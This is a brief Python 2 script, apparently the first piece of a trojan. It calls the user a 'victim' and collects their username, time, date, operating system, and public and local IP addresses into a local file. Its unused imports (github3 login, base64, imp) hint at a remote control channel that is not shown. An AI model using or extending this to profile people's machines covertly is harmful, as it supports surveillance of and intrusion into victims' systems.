import sys
import socket
from urllib2 import urlopen
import time
import getpass
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

victim = str(getpass.getuser())

f1=open(victim, 'w+')

print (time.strftime("%H:%M:%S"))
f1.write("Time: %s\n" % time.strftime("%H:%M:%S"))


print (time.strftime("%d/%m/%Y"))
f1.write("Date: %s\n" % time.strftime("%d/%m/%Y"))


print victim
f1.write("User: %s\n" % victim)


my_ip = urlopen('http://ip.42.pl/raw').read()
	
if sys.platform.startswith('win32'):
	print("OS: Windows")
	f1.write("OS: Windows\n")
elif sys.platform.startswith('linux2'):
	print("OS: Linux")
	f1.write("OS: Linux")
elif sys.platform.startswith('cygwin'):
	print("OS: Windows/Cygwin")
	f1.write("OS: Windows/Cygwin")
elif sys.platform.startswith('darwin'):
	print("OS: Mac OS X")
	f1.write("OS: Mac OS X")
elif sys.platform.startswith('os2'):
	print("OS: OS/2")
	f1.write("OS: OS/2")
elif sys.platform.startswith('os2emx'):
	print("OS: OS/2 EMX")
	f1.write("OS: OS/2 EMX")
elif sys.platform.startswith('riscos'):
	print("OS: RiscOS")
	f1.write("OS: RiscOS")
elif sys.platform.startswith('atheos'):
	print("OS: AtheOS")
	f1.write("OS: AtheOS")

print "IPv4 Public: %s" % my_ip
f1.write("Public IPv4: %s\n" % my_ip)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
print "IPv4 Local: %s" % s.getsockname()[0]
f1.write("Local IPv4: %s" % s.getsockname()[0])
f1.close()

